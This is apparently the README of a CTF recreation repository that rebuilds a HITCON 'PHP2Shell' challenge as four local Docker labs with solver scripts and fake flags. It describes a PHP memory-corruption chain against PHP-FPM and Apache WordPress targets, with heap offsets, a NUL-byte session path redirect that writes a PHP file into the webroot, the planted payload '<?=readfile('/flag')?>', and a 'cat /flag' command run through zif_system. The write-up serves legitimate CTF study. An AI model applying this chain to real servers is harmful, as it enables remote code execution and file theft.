# PHP2Shell - full local four-profile recreation

This repository runs a complete **local 4/4 recreation** of the tested challenge shapes:

- one pinned Nginx/PHP-FPM 8.3.35/WordPress 7.1.3 target;
- one pinned Nginx/PHP-FPM 8.4.26/WordPress 6.9.10 target;
- one pinned Nginx/PHP-FPM 8.5.11/WordPress 6.9.10 target;
- one pinned Apache/mod_php 8.4.26/WordPress 7.0.7 target;
- one different dummy flag from each target.

This is not an authentic HITCON solve. The organizer image and live instancer were unavailable. Every profile is a local clone and every flag is deliberately fake.

## Profile status

| Profile | PHP | WordPress | Result | Geometry |
| --- | ---: | ---: | --- | --- |
| `fpm83` | 8.3.35 | 7.1.3 | Full local dummy-flag read | `P-B=0x8662000`, `Q-B=0x742d9d8` |
| `fpm84` | 8.4.26 | 6.9.10 | Full local dummy-flag read | Paired BIG/P/Q candidate tuples |
| `fpm85` | 8.5.11 | 6.9.10 | Full local dummy-flag read | Bounded local P/Q candidate sets |
| `apache-wordpress` | 8.4.26 | 7.0.7 | Full local dummy-flag copy | Public A1/B1/A2/B2 geometry |

All three FPM solvers fingerprint PHP, WordPress and the relevant INI settings before using profile-specific payload geometry. They only accept loopback targets and have no remote-host mode.

```text
FPM 8.3 -> seed -> leak -> R2a -> R2b -> R3 -> flag A
FPM 8.4 -> seed -> leak -> R2a -> R2b -> R3 -> flag B
FPM 8.5 -> seed -> leak -> R2a -> R2b -> R3 -> flag C
Apache  -> A1 -> B1 leak -> A2 -> B2 -> flag D
```

No exploit stage uses GDB. Docker is used to build/restart the local labs and to verify local FPM worker/session state that would not be available remotely.

## Files

```text
.
├── solve_all.py              # builds all supported profiles and collects 4/4 flags
├── solve.py                  # PHP 8.5 FPM chain
├── payloads.py               # PHP 8.5 multipart builders
├── profiles/fpm83/
│   ├── solve.py              # PHP 8.3 FPM chain
│   ├── payloads.py           # PHP 8.3 multipart builders
│   └── compose.yaml
├── profiles/fpm84/
│   ├── solve.py              # PHP 8.4 FPM chain
│   ├── payloads.py           # PHP 8.4 multipart builders
│   ├── calibrate.py          # bounded loopback leak calibration
│   └── compose.yaml
├── apache/
│   ├── solve.py              # Apache A1/B1/A2/B2 chain
│   └── payloads.py           # Apache payload builders
├── lab/
│   ├── compose.yaml          # disposable PHP 8.5 FPM target
│   ├── install.py            # loopback WordPress installer/primer
│   └── apache/               # disposable Apache/WordPress target
└── evidence/                 # sanitized local result evidence
```

No third-party Python package is required.

## Full local 4/4 run

Requirements:

- Docker with Compose;
- Python 3.11+;
- around 4 GB free memory for the 150-worker Apache profile;
- loopback ports `18234`, `18235`, `18233` and `18322` available.

The offline plan does not start containers or send requests:

```bash
python3 solve_all.py
```

Run the complete local recreation:

```bash
python3 solve_all.py --execute
```

If Docker Desktop is exposed through the Windows CLI rather than a WSL Docker socket:

```bash
python3 solve_all.py --execute --docker-command docker.exe
```

A successful run returns:

```text
hitcon{local_fpm83_instance_do_not_submit}
hitcon{local_fpm84_instance_do_not_submit}
hitcon{local_fpm85_instance_do_not_submit}
hitcon{local_apache_instance_do_not_submit}
4/4 local dummy flags across four pinned profiles

The runner tears down each container, network and database volume unless `--keep-labs` is supplied. Request/response evidence stays under `runs/full-local-*/` and is ignored by Git.

The matrix permits up to three clean attempts for FPM83 and FPM84 by default. FPM83's fixed local Q placement can miss on a fresh lineage; FPM84 can lose a reflected pointer byte or select a different measured BIG/P tuple. Use `--fpm83-attempts 1..5` and `--fpm84-attempts 1..5` to change those bounds. Every retry recreates the profile database and webroot volumes.

## PHP 8.5 profile

Copy the disposable database configuration, build the target and install WordPress:

```bash
cp lab/.env.example lab/.env
docker compose --env-file lab/.env -f lab/compose.yaml up -d --build
python3 lab/install.py --port 18233 --title HITCON-LAB-FPM85
```

The image pins PHP 8.5.11 and verifies the WordPress 6.9.10 archive hash:

```text
a1c0dc12e2271c6afaabf329d5af7a976f8d2c8c592773178a5baaeafc2d4f4a
```

Build and inspect the payload plan without sending requests:

```bash
python3 solve.py
```

Run the chain:

```bash
python3 solve.py --execute --restart-at-start
```

The solver tries only the bounded locally measured P/Q candidate sets printed by the offline plan. It refuses non-loopback hosts and mismatched PHP/WordPress/INI fingerprints.

## PHP 8.3 profile

Use a five-digit loopback port; `18234` is the default:

```bash
export DB_PASSWORD=local-test-password
export DB_ROOT_PASSWORD=local-test-root-password
export LOCAL_FLAG='hitcon{local_fpm83_dummy_do_not_submit}'
export LAB_PORT=18234
docker compose -f profiles/fpm83/compose.yaml up -d --build
python3 lab/install.py --port 18234 --title HITCON-LAB-FPM83
```

The image pins PHP 8.3.35 and verifies the WordPress 7.1.3 archive hash:

```text
d2a09acb6a15e3b9c471d72557753c266d6f41a79ed19bfe04cbfe49e283b2a5
```

Build and inspect the exact payload plan without sending requests:

```bash
python3 profiles/fpm83/solve.py
```

Run the chain:

```bash
python3 profiles/fpm83/solve.py --execute --restart-at-start \
  --accept-fixed-geometry --port 18234
```

The explicit acceptance flag is required because this profile uses fixed offsets measured on the pinned image. The solver requires PHP 8.3.35, WordPress 7.1.3, `memory_limit=128M`, upload progress enabled and `/tmp` session storage.

## PHP 8.4 profile

The profile uses loopback port `18235` and fixed geometry measured on the pinned image:

```bash
export DB_PASSWORD=local-test-password
export DB_ROOT_PASSWORD=local-test-root-password
export LOCAL_FLAG='hitcon{local_fpm84_dummy_do_not_submit}'
export LAB_PORT=18235
docker compose -f profiles/fpm84/compose.yaml up -d --build
python3 lab/install.py --port 18235 --title HITCON-LAB-FPM84
```

The image pins PHP 8.4.26 and verifies the WordPress 6.9.10 archive hash:

```text
a1c0dc12e2271c6afaabf329d5af7a976f8d2c8c592773178a5baaeafc2d4f4a
```

Inspect or execute the packaged chain:

```bash
python3 profiles/fpm84/solve.py
python3 profiles/fpm84/solve.py --execute --restart-at-start \
  --accept-fixed-geometry --port 18235
```

The depth-55 leak places fourteen aligned pointers at reflected value offsets `104..215`. Replacement workers use two observed BIG/Q lineages and two observed progress-object placements:

| `BIG` value − B | P − B | Q − B |
| ---: | ---: | ---: |
| `0x801a018` | `0x8862000` | `0x53a398` |
| `0x7e1a018` | `0x8862000` | `0x33a398` |
| `0x801a018` | `0x8a62000` | `0x53a398` |
| `0x7e1a018` | `0x8a62000` | `0x33a398` |

The solver tries each complete tuple; it never mixes BIG/Q offsets from different lineages. A missed R2a attempt preserves the seeded array, allowing bounded retries without resetting the lab.


## FPM chain

### Producer and stale decoder state

Each producer reaches `php_var_unserialize_init()`, publishes `BG(unserialize).data`, then hits the 128 MiB memory limit before matching cleanup. FPM handles the bailout and keeps the child alive, allowing the next multipart request to consume stale decoder state.

### Heap leak

WordPress reflects a 291-byte value in the search input. The solver validates the filler boundaries, canonical aligned pointer words and a single 2 MiB chunk base:

```python
B = leaked_pointer & ~0x1fffff
```

### R2a and R2b

R2a converts the seeded upload-progress value into one scalar root. R2b adds a second empty-array root. Those roots provide one then two controlled decoder stores:

```text
F->data[F->used_slots++] = source_zval_pointer
```

PHP 8.3 records:

```text
upload_progress_K|b:0;
upload_progress_K|b:0;upload_progress_J|a:0:{}
```

PHP 8.4 and 8.5 records:

```text
upload_progress_stockdwatch|i:0;
upload_progress_stockdwatch|i:0;upload_progress_K2stage0001|a:0:{}
```

### R3 webroot write

R3 redirects the files session handler to `/var/www/html/r3-<sid>.php\0`. PHP appends its normal session suffix, while the filesystem sees only the path before the NUL. The tracked upload filename is:

```php
<?=readfile('/flag')?>
```

Upload-progress serialization writes that string into the redirected session file. The final loopback GET executes it and returns the local dummy flag.


## Apache chain

The Apache profile uses PHP 8.4.26, WordPress 7.0.7 and the official prefork configuration with 150 workers.

```text
A1: memory bailout leaves the session ID state stale
B1: forged ID returns an 819200-byte cookie leak
A2: another bailout leaves session variables dangling
B2: fake reference -> fake HashTable -> zif_system
```

B1 discloses both `libphp` and the main Zend heap chunk. B2 runs:

```sh
cat /flag >/out/local_flag
```

The selected Apache child normally crashes after the destructor callback, but the command completes first and Apache replaces that child. See [`apache/README.md`](apache/README.md) for the public research source used for the payload geometry.

## Limits

These are **profile-specific local replays**, not a universal exploit for arbitrary PHP-FPM installations. The HTTP leak discloses `B`; it does not remotely derive every allocator placement. Image version, loaded extensions, allocator state, WordPress state, request geometry and web-server behavior remain part of each profile contract.

The organizer image, real challenge instances, real flags and platform acceptance remain unavailable. Every marker in this repository is local and fake.

## Evidence

- [`evidence/fpm83-local.json`](evidence/fpm83-local.json): clean PHP-FPM 8.3 dummy-flag proof.
- [`evidence/fpm84-local.json`](evidence/fpm84-local.json): clean PHP-FPM 8.4 dummy-flag proof.
- [`evidence/full-local.json`](evidence/full-local.json): clean versioned 4/4 matrix run.
- [`evidence/results.json`](evidence/results.json): earlier single-profile local runs.

## Stopping standalone labs

```bash
docker compose --env-file lab/.env -f lab/compose.yaml down -v
docker compose -f profiles/fpm83/compose.yaml down -v
docker compose -f profiles/fpm84/compose.yaml down -v
```

## References

- <https://github.com/3em0/php2shell>
- <https://github.com/alvarodh5/php2shell>
- `9bie/php2shell`, commit `d6f888ebd3f0e188bb662e16f23747afdf35e42f`

The code in this repository is MIT licensed. PHP, WordPress, Nginx and MariaDB retain their own licenses.
